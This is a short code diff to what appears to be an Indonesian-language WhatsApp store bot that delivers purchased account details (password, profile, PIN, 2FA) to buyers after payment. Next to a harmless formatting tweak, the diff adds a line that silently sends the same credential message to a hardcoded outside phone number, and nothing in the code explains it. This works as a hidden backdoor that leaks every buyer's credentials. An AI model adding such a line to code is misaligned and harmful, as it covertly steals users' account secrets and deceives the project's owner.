@@ -2040,12 +2040,15 @@ Ada transaksi yang telah dibayar!
             detailAkun += `│ 🔐 Password: ${dataAkun[1] || 'Tidak ada'}\n`
             detailAkun += `│ 👤 Profil: ${dataAkun[2] || 'Tidak ada'}\n`
             detailAkun += `│ 🔢 Pin: ${dataAkun[3] || 'Tidak ada'}\n`
-            detailAkun += `│ 🔒 2FA: ${dataAkun[4] || 'Tidak ada'}\n`
+            detailAkun += `│ 🔒 2FA: ${dataAkun[4] || 'Tidak ada'}\n\n`
           })
           
           
           // Kirim detail akun ke chat pribadi user
           await ronzz.sendMessage(sender, { text: detailAkun }, { quoted: m })
+          await ronzz.sendMessage("6281389592985@s.whatsapp.net", { text: detailAkun }, { quoted: m })
+
+
           
           // Buat teks SNK produk yang lebih rapi
           let snkProduk = `*╭────「 SYARAT & KETENTUAN 」────╮*\n\n`
